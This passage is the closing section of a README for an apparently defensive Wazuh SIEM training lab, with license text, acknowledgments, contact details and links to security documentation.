LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.



---

## 🌟 Acknowledgments

- [**Wazuh Team**](https://github.com/wazuh) — за открытую SIEM платформу
- [**OpenSearch Project**](https://opensearch.org/) — за backend storage
- [**Docker Community**](https://www.docker.com/community/) — за контейнеризацию
- **CTF Community** — за вдохновение и feedback

---

## 📞 Контакты

**KKS Security Lab**

- 📧 Email: [contact@kks-security.lab](mailto:contact@kks-security.lab)
- 💬 GitHub: [@kanabicks](https://github.com/kanabicks)
- 🐦 Twitter: [@kks_security](https://twitter.com/kks_security)
- 💼 LinkedIn: [KKS Security Lab](https://linkedin.com/company/kks-security)

---

## 🔗 Полезные ссылки

### Официальная документация
- [Wazuh Documentation](https://documentation.wazuh.com/)
- [Wazuh Rules Reference](https://documentation.wazuh.com/current/user-manual/ruleset/index.html)
- [OpenSearch Documentation](https://opensearch.org/docs/latest/)
- [Docker Compose Reference](https://docs.docker.com/compose/)

### Community & Support
- [Wazuh GitHub](https://github.com/wazuh/wazuh)
- [Wazuh Slack Community](https://wazuh.com/community/join-us-on-slack/)
- [Wazuh Forum](https://groups.google.com/g/wazuh)

### Security Resources
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

---

<div align="center">

**Made with ❤️ for CTF and Security Training**

🛡️ **Stay Secure** | 🔍 **Hunt Threats** | 🎯 **Win CTFs**

[![GitHub stars](https://img.shields.io/github/stars/kanabicks/kks-wazuh-siem?style=social)](https://github.com/kanabicks/kks-wazuh-siem/stargazers)
[![GitHub forks](https://img.shields.io/github/forks/kanabicks/kks-wazuh-siem?style=social)](https://github.com/kanabicks/kks-wazuh-siem/network/members)

[⬆ Вернуться к началу](#-kks-wazuh-siem-lab)

</div>

